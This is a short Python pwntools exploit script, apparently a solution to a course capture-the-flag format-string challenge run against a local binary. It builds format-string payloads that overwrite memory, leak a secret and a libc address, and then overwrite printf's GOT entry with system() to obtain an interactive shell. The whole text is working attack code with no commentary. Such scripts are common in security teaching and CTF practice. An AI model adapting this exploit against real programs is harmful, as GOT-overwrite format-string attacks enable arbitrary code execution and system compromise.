from pwn import *

#r = remote("csie.ctf.tw", 10129)
r = process("./fmt-2f8c13e378f1b75401a76e8a839e4dc2")
a = 0x6012ac

p = "%45068c%24$hn%19138c%25$hnABC%8$p.%9$pABC%26$s".ljust(0x40, "\x00") + p64(a) + p64(a+2) + p64(0x6011e0)

r.sendafter("name ?", p)
r.recvuntil('ABC0x')

secret = p64(int(r.recvuntil('.0x')[:-3], 16)) + p64(int(r.recvuntil('ABC')[:-3],16))
libc = u64(r.recv(6).ljust(8, "\x00")) - 0x21ab0

r.recvuntil('}')
r.sendafter("?", secret)
r.recvuntil('}')

printf_got = 0x601230
system = libc + 0x4f440
fmt = "%{}c%13$hhn%{}c%14$hn".format(system & 0xff, ((system & 0xffff00) >> 8) - (system & 0xff)).ljust(0x18, '\x00') + p64(printf_got) + p64(printf_got+1)
r.sendafter(":", fmt)
r.interactive()
